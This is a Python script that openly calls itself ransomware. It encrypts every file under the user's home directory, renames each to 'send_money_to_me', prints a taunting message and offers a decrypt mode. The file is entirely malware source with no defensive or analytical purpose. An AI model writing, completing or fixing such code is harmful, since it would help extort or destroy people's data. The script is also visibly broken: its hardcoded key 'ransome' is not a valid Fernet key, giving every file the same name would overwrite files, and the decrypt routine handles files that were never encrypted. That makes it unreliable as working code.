import os
import argparse
import hashlib
from cryptography.fernet import Fernet

def generate_file_hashes(home_directory):
    file_hashes = {}
    for root, dirs, files in os.walk(home_directory):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path == os.path.abspath(__file__):  # Skip hashing the script file itself
                continue
            with open(file_path, "rb") as f:
                data = f.read()
            file_hash = hashlib.md5(data).hexdigest()
            file_hashes[file_hash] = file_path
    with open("file_hashes.txt", "w") as f:
        for file_hash, file_path in file_hashes.items():
            f.write(f"{file_hash} {file_path}\n")

def encrypt_files(verbose=False):
    key = b'ransome'  # Hardcoded encryption key
    fernet = Fernet(key)
    home_directory = "~"
    home_directory = os.path.expanduser(home_directory)
    if verbose:
        print("Encrypting files...")
    generate_file_hashes(home_directory)
    for root, dirs, files in os.walk(home_directory):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path == os.path.abspath(__file__):  # Skip encrypting the script file itself
                continue
            if verbose:
                print("Encrypting:", file_path)
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
            # Rename the file to "send_money_to_me"
            os.rename(file_path, os.path.join(root, "send_money_to_me"))
    if verbose:
        print("Encryption complete.")

def decrypt_files(verbose=False):
    key = b'ransome'  # Hardcoded encryption key
    fernet = Fernet(key)
    home_directory = "~"
    home_directory = os.path.expanduser(home_directory)
    if verbose:
        print("Decrypting files...")
    with open("file_hashes.txt", "r") as f:
        file_hashes = {line.split()[0]: line.split()[1] for line in f}
    for root, dirs, files in os.walk(home_directory):
        for file in files:
            file_path = os.path.join(root, file)
            if verbose:
                print("Decrypting:", file_path)
            with open(file_path, "rb") as f:
                data = f.read()
            decrypted_data = fernet.decrypt(data)
            with open(file_path, "wb") as f:
                f.write(decrypted_data)
            # Rename the file back to its original name based on the MD5 hash
            for file_hash, original_name in file_hashes.items():
                if file_path.endswith("send_money_to_me") and hashlib.md5(decrypted_data).hexdigest() == file_hash:
                    os.rename(file_path, original_name)
    if verbose:
        print("Decryption complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ransomware script")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")
    parser.add_argument("-d", "--decrypt", action="store_true", help="Decrypt files instead of encrypting")
    args = parser.parse_args()

    print("You've been bamboozled.")

    if args.verbose:
        print("Verbose mode is enabled.")

    if args.decrypt:
        decrypt_files(verbose=args.verbose)
    else:
        encrypt_files(verbose=args.verbose)
